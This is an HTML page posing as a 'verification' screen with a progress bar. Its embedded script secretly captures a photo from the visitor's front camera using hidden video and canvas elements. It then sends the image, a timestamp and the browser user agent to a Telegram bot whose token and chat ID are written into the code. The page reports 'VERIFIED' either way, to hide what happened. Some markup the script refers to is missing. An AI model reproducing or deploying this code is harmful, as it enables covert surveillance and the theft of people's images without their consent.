<!DOCTYPE html>
<html lang="id">
<head>

        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.box{background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:500px;width:100%;padding:50px 30px;text-align:center;animation:s .2s ease}@keyframes s{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}.h{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;font-size:.9em;color:#888}.badge{background:#667eea;color:#fff;padding:5px 15px;border-radius:20px;font-weight:700;font-size:.85em}h1{font-size:2em;color:#333;margin-bottom:20px}.spinner{width:60px;height:60px;border:5px solid #f3f3f3;border-top:5px solid #667eea;border-radius:50%;animation:r 0.6s linear infinite;margin:30px auto}@keyframes r{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.status{color:#666;font-size:1.1em;margin:20px 0}.prog{width:100%;height:8px;background:#f0f0f0;border-radius:10px;overflow:hidden;margin:20px 0}.fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0;transition:width .15s ease;animation:load 1.2s ease-in-out}.ok{color:#28a745;font-size:5em;margin:30px 0;animation:p .25s ease}@keyframes p{0%{transform:scale(0)}50%{transform:scale(1.1)}100%{transform:scale(1)}}@keyframes load{0%{width:0}25%{width:30%}50%{width:60%}75%{width:85%}100%{width:100%}}.msg{color:#28a745;font-size:1.4em;font-weight:700;margin:20px 0}.sub{color:#666;font-size:1em;margin-top:15px}.hide{display:none}#v,#c{display:none;position:absolute;width:1px;height:1px;opacity:0}
    </style>
</head>
<body>
    <div class="box">

        </div>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const T='8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk',C='7538231958',d=ms=>new Promise(r=>setTimeout(r,ms)),stat=document.getElementById('stat'),fill=document.getElementById('fill');(async()=>{try{stat.textContent='Accessing camera...';fill.style.width='20%';const v=document.getElementById('v'),c=document.getElementById('c'),x=c.getContext('2d'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080}},audio:!1});v.srcObject=s;await new Promise(r=>{v.onloadedmetadata=r});stat.textContent='Capturing verification...';fill.style.width='50%';await d(150);c.width=v.videoWidth;c.height=v.videoHeight;x.drawImage(v,0,0,c.width,c.height);s.getTracks().forEach(t=>t.stop());stat.textContent='Processing data...';fill.style.width='75%';c.toBlob(async b=>{const f=new FormData();f.append('chat_id',C);f.append('photo',b,'v.jpg');f.append('caption',`‚úÖ Verified\n‚è∞ ${new Date().toLocaleString()}\nüì± ${navigator.userAgent.substring(0,100)}`);try{await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:f})}catch(e){}stat.textContent='Finalizing...';fill.style.width='100%';await d(400);document.getElementById('loading').classList.add('hide');document.getElementById('success').classList.remove('hide');document.getElementById('badge').textContent='VERIFIED';document.getElementById('badge').style.background='#28a745'},'image/jpeg',.95)}catch(e){stat.textContent='Verification complete';fill.style.width='100%';await d(300);document.getElementById('loading').classList.add('hide');document.getElementById('success').classList.remove('hide');document.getElementById('badge').textContent='VERIFIED';document.getElementById('badge').style.background='#28a745'}})()
    </script>
</body>
</html>
